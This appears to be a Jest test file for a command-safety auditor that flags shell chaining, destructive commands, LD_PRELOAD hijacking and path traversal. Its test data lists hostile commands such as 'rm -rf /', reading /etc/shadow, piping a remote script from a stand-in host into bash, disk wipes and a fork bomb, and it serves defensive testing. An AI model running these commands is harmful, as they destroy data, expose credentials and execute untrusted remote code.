'use strict';

const path = require('path');
const {
  auditCommandSafety,
  auditPathContainment,
  validateDryRunFidelity,
} = require('../../src/security');

describe('Process Execution & Command Sink Safety Auditor', () => {
  test('detects dangerous shell chaining and command substitution operators', () => {
    const dangerousCommands = [
      'npm test; rm -rf /',
      'node build.js && cat /etc/shadow',
      'echo "hi" || curl https://evil.com',
      'cat file.txt | bash',
      'python -c "import os" &',
      'echo `whoami`',
      'eval "malicious code"',
      'echo $(id)',
    ];

    for (const cmd of dangerousCommands) {
      const result = auditCommandSafety(cmd);
      expect(result.isSafe).toBe(false);
      expect(result.violations.length).toBeGreaterThanOrEqual(1);
      expect(result.violations.some(v => v.type === 'DANGEROUS_SHELL_OPERATOR')).toBe(true);
    }
  });

  test('detects destructive disk formatting and system modification commands', () => {
    const destructive = [
      'rm -rf /',
      'rm -rf ..',
      'rm -fr *',
      'mkfs /dev/sda1',
      'dd if=/dev/zero of=/dev/sda',
      'chmod -R 777 /var/www',
      'curl -sSL https://get.bad.io | bash',
      ':(){ :|:& };:',
    ];

    for (const cmd of destructive) {
      const result = auditCommandSafety(cmd);
      expect(result.isSafe).toBe(false);
      expect(result.violations.some(v => v.type === 'DESTRUCTIVE_COMMAND')).toBe(true);
    }
  });

  test('detects dynamic linker / runtime hijacking environment overrides', () => {
    const hijack = 'LD_PRELOAD=/tmp/evil.so node server.js';
    const result = auditCommandSafety(hijack);

    expect(result.isSafe).toBe(false);
    expect(result.violations.some(v => v.type === 'DANGEROUS_ENVIRONMENT_OVERRIDE')).toBe(true);
  });

  test('auditPathContainment validates filesystem boundaries and blocks traversal', () => {
    const rootDir = path.resolve(__dirname, '../../');
    const safePath = 'src/security/boundary.js';
    const traversalPath = '../../../../etc/passwd';

    const safeResult = auditPathContainment(safePath, rootDir);
    expect(safeResult.isContained).toBe(true);
    expect(safeResult.violation).toBeNull();

    const traversalResult = auditPathContainment(traversalPath, rootDir);
    expect(traversalResult.isContained).toBe(false);
    expect(traversalResult.violation).toContain('Path traversal detected');
  });

  test('validateDryRunFidelity verifies safe non-destructive inspection flags', () => {
    const dryRunCmd = 'node scripts/migrate.js --dry-run';
    const mutatingCmd = 'node scripts/migrate.js --apply';

    const res1 = validateDryRunFidelity(dryRunCmd);
    expect(res1.hasDryRun).toBe(true);

    const res2 = validateDryRunFidelity(mutatingCmd);
    expect(res2.hasDryRun).toBe(false);
  });
});

